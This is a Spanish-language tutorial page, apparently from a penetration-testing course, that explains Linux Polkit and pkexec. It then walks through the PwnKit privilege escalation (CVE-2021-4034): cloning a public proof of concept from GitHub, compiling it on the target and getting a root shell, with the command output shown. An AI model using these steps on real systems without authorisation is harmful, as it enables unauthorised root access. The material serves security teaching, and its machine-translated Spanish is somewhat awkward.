# Polkit

---

PolicyKit (`polkit`) es un servicio de autorización en sistemas operativos basados ​​en Linux que permite que el software de usuario y los componentes del sistema se comuniquen entre sí si el software del usuario está autorizado a hacerlo. Para verificar si el software del usuario está autorizado para esta instrucción,`polkit`se le pregunta. Es posible establecer cómo se otorgan los permisos de forma predeterminada para cada usuario y aplicación. Por ejemplo, para cada usuario, se puede establecer si la operación debe estar generalmente permitida o prohibida, o la autorización como administrador o como usuario separado con una validez única, limitada por el proceso, limitada por sesión o ilimitada. Para usuarios y grupos individuales, las autorizaciones se pueden asignar individualmente.

Polkit funciona con dos grupos de archivos.

1. acciones/políticas (`/usr/share/polkit-1/actions`)
2. normas (`/usr/share/polkit-1/rules.d`)

Polkit también tiene`local authority`Reglas que se pueden usar para establecer o eliminar permisos adicionales para usuarios y grupos. Se pueden colocar reglas personalizadas en el directorio`/etc/polkit-1/localauthority/50-local.d`con la extensión del archivo`.pkla`.

Polkit también viene con tres programas adicionales:

- `pkexec`- ejecuta un programa con los derechos de otro usuario o con derechos raíz
- `pkaction`- se puede usar para mostrar acciones
- `pkcheck`- Esto se puede usar para verificar si un proceso está autorizado para una acción específica

La herramienta más interesante para nosotros, en este caso, es`pkexec`porque realiza la misma tarea que`sudo`y puede ejecutar un programa con los derechos de otro usuario o raíz.

  Polkit

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

En el`pkexec`herramienta, la vulnerabilidad de la corrupción de memoria con el identificador[CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)fue encontrado, también conocido como[Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)y también conduce a la escalada de privilegios. Esta vulnerabilidad también estuvo oculta durante más de diez años, y nadie puede decir con precisión cuándo fue descubierto y explotado. Finalmente, en noviembre de 2021, esta vulnerabilidad fue publicada y solucionada dos meses después.

Para explotar esta vulnerabilidad, necesitamos descargar un[POC](https://github.com/arthepsy/CVE-2021-4034)y compilarlo en el sistema de destino en sí o una copia que hemos hecho.

  Polkit

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Una vez que hemos compilado el código, podemos ejecutarlo sin más preámbulos. Después de la ejecución, cambiamos del shell estándar (`sh`) para golpear (`bash`) y verifique las ID del usuario.

  Polkit

```shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```